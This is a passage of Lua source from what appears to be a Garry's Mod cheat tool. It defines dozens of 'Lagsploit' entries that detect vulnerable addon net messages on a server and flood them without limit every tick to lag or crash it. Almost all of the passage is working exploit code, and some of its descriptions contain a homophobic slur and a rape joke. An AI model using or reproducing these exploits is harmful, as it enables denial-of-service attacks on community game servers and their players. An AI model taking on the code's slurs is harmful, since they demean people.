            KV.NetStart(sploit, "ats_send_toServer")

            net.WriteTable({" ", "Open", nil, nil, nil, nil})

            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "I swear these devs couldn't code to save their lives",
    severity = function() return math.Clamp(player.GetCount(), 1, 100) end,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("TFA_Attachment_RequestAll") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "TFA_Attachment_RequestAll")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Console: cries internally",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("NDES_SelectedEmblem") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "NDES_SelectedEmblem")
            net.WriteString("ODIUM.PRO")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "ODIUM.PRO isn't a valid organisation",
    severity = 90,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("JoinOrg") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "JoinOrg")
            net.WriteEntity(KV.GetLP())
            net.WriteString("ODIUM.PRO")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Something is creating very strong script errors",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("steamid50") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "steamid50")
            net.WriteString("Something is creating very strong script errors")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "This function is very inefficient for large tables and should probably not be called in things that run each frame",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("BM2.Command.SellBitcoins") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "BM2.Command.SellBitcoins")
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Another of the same",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("metrostroi-specbutton-press") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "metrostroi-specbutton-press")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

--[[KV.AddExploit( "Lagsploit", {
    desc = "Causes decent lag but requires being near a wire keypad",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = function(sploit)
        local tbl = KV.RecursiveGetVar(sploit, {"vars", "Think", "ents"}, "table", true)
        KV.SetTableContents(tbl, KV.GetVarTable(ents.FindInSphere(KV.GetLP():GetShootPos(), 50), "GetClass", KV.TYPEVARS.EQUALTO, "gmod_wire_keypad"))
        return #tbl
    end,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString( "wire_keypad" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.RecursiveGetVar(sploit, {"vars", "Think", "ents"}, "table", true)) do
                KV.NetStart( sploit, "wire_keypad")
                net.WriteEntity(v)
                net.WriteUInt(10, 4)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )]]
--Doesn't work but good example of function usage
KV.AddExploit("Lagsploit", {
    desc = "Hack the mainframe",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("friendlist") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "friendlist")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Yes, I am many people",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 3,
    msgs_per_tick = function(sploit) return #KV.GetStored("jdc_plyz", {}) end,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("join_disconnect") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("jdc_plyz", {})) do
                if IsValid(v) then
                    KV.NetStart(sploit, "join_disconnect")
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "jdc_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Win every HvH",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("hvh_setloadout") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "hvh_setloadout")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Slay the Titan",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("Cl_PrometheusRequest") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "Cl_PrometheusRequest")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "This guy really needs to stop selling his scripts",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("CRAFTINGMOD") or KV.DynamicNetString("FARMINGMOD") or KV.DynamicNetString("FISHINGMOD") or KV.DynamicNetString("bicyclemod") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit, {
                ["bicyclemod_sell_bicycle"] = function()
                    net.WriteEntity(KV.GetLP())
                end,
                ["bicyclemod_store_bicycle"] = function()
                    net.WriteEntity(KV.GetLP())
                end,
                ["bicyclemod_create_bicycle"] = function()
                    net.WriteTable({})
                    net.WriteEntity(KV.GetLP())
                end,
            })
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"CRAFTINGMOD_INVENTORY", "CRAFTINGMOD_SHOP", "CRAFTINGMOD_STORAGE", "CRAFTINGMOD_TRADING", "CRAFTINGMOD_MOVE", "CRAFTINGMOD_LEVELS", "CRAFTINGMOD_ADMIN", "CRAFTINGMOD_COMMANDS", "FARMINGMOD_ADMIN", "FARMINGMOD_HARVEST", "FARMINGMOD_ADDITEM", "FARMINGMOD_HARVEST", "FARMINGMOD_USE", "FARMINGMOD_DROPITEM", "FARMINGMOD_SELLITEM", "FARMINGMOD_PLANTOPTION", "FARMINGMOD_BUYITEM", "bicyclemod_create_bicycle", "bicyclemod_sell_bicycle", "bicyclemod_store_bicycle", "FISHINGMOD_ADMIN", "FISHINGMOD_BAIT", "FISHINGMOD_INVENTORY"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Dab on the server",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 3,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("sphys_dupe") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "sphys_dupe")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Another one bites the dust",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return WireLib ~= nil end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"wire_expression2_request_file", "wire_adv_upload", "wire_expression2_request_list", "wire_adv_unwire", "wire_expression2_client_request_set_extension_status"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Remind the server to download more RAM",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("pp_info_send") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "pp_info_send")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "My mom says I'm beautiful in my own way *sits on server*",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("Prop2Mesh") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"Prop2MeshPostRemove", "Prop2MeshUpdateNWs"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "*nuzzles server*",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return istable(TeamTable) end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"DemoteUser", "PromoteUser"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Incident ID: SERVER/1337 Reason: Cheating",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("controlled_vars") or KV.DynamicNetString("diagnostics") or KV.DynamicNetString("luadev") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"diagnostics1", "diagnostics2", "diagnostics3", "controlled_vars", KV.DynamicNetString("luadev")}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "game.GetWorld():Remove()",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("ContentRmvProps") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "ContentRmvProps")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "LocalPlayer():SetClothing(nil)",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("bodygroups_change") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "bodygroups_change")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Wash the server fans to keep them clean",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("PS_ModifyItem") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "PS_ModifyItem")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "System.AllocMem(System.GetMem());",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return VJBASE_VERSION ~= nil end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"vj_npcmover_removeall", "vj_npcmover_sv_startmove"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Use the servers GPU as a miner",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("aom_set_bool") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "aom_set_bool")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Place a hit on the server",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("hhh_request") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "hhh_request")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Force the server to listen to Gucci Gang",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return MGangs ~= nil or isfunction(MG_AdminMenu) end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"MG2.Gang.Create", "MG2.Gang.UpdateGroups", "mg_creategang", "mg_plyupdateganggroups"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "It's flu season and the server forgot to get vaccinated",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("smartdisease") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"smartdisease_buy", "smartdisease_buy_vaccine"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "cl_ping_delay 0",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("StatusScreen_Ping") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "StatusScreen_Ping")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Preparing to send data [inf parts]",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("ScreengrabInitCallback") or KV.ValidNetString("grab_ScreenshotToServer") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"ScreengrabInitCallback", "grab_ScreenshotToServer"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "SERVER: *crashes internally*",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("sgGiveFriendStatusAll") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "sgGiveFriendStatusAll")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Be the giant flamboyant faggot kid",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("NStatistics_SendPlayerStatistic") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "NStatistics_SendPlayerStatistic")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "The load limit is 40 tonnes but you're hauling 110",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("SCarSpawnSendFile") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "SCarSpawnSendFile")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Man, this server sure is laggy today",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("ts_buytitle") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "ts_buytitle")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Pull the power plug on the server",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("UpdateNameColor") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "UpdateNameColor")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "I'll take one serving of poorly optimized code, please",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("noob_playerperks") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "noob_playerperks")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Who needs doors when you can just smash through a wall?",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("advdoors") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"advdoors_purchasemod", "advdoors_updaterent", "advdoors_rent", "advdoors_settitle", "advdoors_coowneradd", "advdoors_coownerallowedremove", "advdoors_coownerremove", "advdoors_transferownership", "advdoors_toggleownership", "advdoors_addblacklist", "advdoors_removeblacklist", "advdoors_addjob", "advdoors_setgroup", "advdoors_jobremove", "advdoors_anyplayer", "advdoors_addjobplayer", "advdoors_jobremoveplayer", "advdoors_changeprice", "advdoors_otheractions"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Fill the server full of lead",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("perm_buyweapon") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "perm_buyweapon")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Pour some gas in the server room and light it up",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("zrush") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit, function()
                net.WriteFloat(KV.GetLP():EntIndex())
            end)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"zrush_BarrelCollectFuel_net", "zrush_BarrelSplitFuel_net", "zrush_MachineCrateOB_Place_net", "zrush_MachineCrateBuilder_DeselectEntity_net"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Drunk drive through the server farm",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("CarDisplayPurchaseCar") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "CarDisplayPurchaseCar")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Beat the server to death with a cash register",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("cashregister") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit, function()
                net.WriteEntity(KV.GetLP())
            end)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"cashregister_settings_color", "cashregister_settings_remowner", "cashregister_settings_addowner", "cashregister_settings_setpayrece", "cashregister_do_reset", "cashregister_do_refound"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Order a DDoS on the Black Market",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("bm_DoAddMarket") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "bm_DoAddMarket")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "There's no brakes on the rape mobile",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("fcd.") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit, {
                ["fcd_chopshopyes"] = function()
                    net.WriteEntity(KV.GetLP())
                end
            })
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"fcd.addVehicle", "fcd.spawnVehicle", "fcd_chopshopyes"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Order an Industrial Grade Lag Bomb",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("gindustrial_item_sources") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "gindustrial_item_sources")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Start Hacking Mission",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("StartHackingMission") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "StartHackingMission")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Damn printers always getting jammed",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("NGII_") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"NGII_TakeMoney", "NGII_UninstallMod"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Only the finest grade lag",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("ncpstoredoact") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "ncpstoredoact")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Purchase a DDoS attack with your spare credits",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("credit_") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"credit_pay", "credit_loan", "credit_loan_deny"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Load up LOIC like a big boy hacker",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("usec_keypad") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "usec_keypad")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Show the world how much of a sore loser you are",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("movePiece") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "movePiece")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Man, this lag sure does make driving difficult",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return nucardealer ~= nil end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"nucauction_post", "nucardealer_spawn"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Looks like the server printer ran out of ink",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return KV.ValidNetString("gPrinters.addUpgrade", "gPrinters.sendID") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"gPrinters.addUpgrade", "gPrinters.sendID"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Faulty printers causing the servers ink to bleed",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("lithium") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"buyLp2Item", "lithium_printers_2_small_rack_screen", "lithiumPrinter2Donator", "lithiumPrinter2Obsidian", "lithiumPrinter2Silver", "lithiumPrinter2Iron", "lithiumPrinter2Economic", "lithiumPrinter2Bronze"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Suggest the server gets better security",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("Suggestions") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"SuggestionsClientEdits", "SuggestionsGetInfo"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "'net library optimizations'",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("LibK") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"LibK_Transaction", "ControllerAction"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Short Circuit the server",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("PS2_ItemServerRPC") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "PS2_ItemServerRPC")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Who thought it was a good idea to run printers on battery?",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("fg_printer") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"fg_printer_upgrade_speed", "fg_printer_upgrade_quality", "fg_printer_upgrade_cooler", "fg_printer_power", "fg_printer_money"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Start a food fight in the server room",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("zfs_") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"zfs_ItemPriceChange_sv", "zfs_ItemBuyUpdate_cl"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Add a special server lag effect to your hat",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return istable(HAT) end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"BuyHats", "SendCustomHatData"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Add a special server lag effect to your hat",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("VChars::") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"VChars::SelectCharacter", "VChars::CreateCharacter"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Modern hardware isn't designed for AI yet",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("npctool") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"npctool_spawner_clearundo", "sv_npctool_spawner_ppoint"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "game.GetWorld():Fire('Kill')",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("npcData") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "npcData")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Flood the server lua stealer",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("gamemode_reload_string") end,
    hooks = {
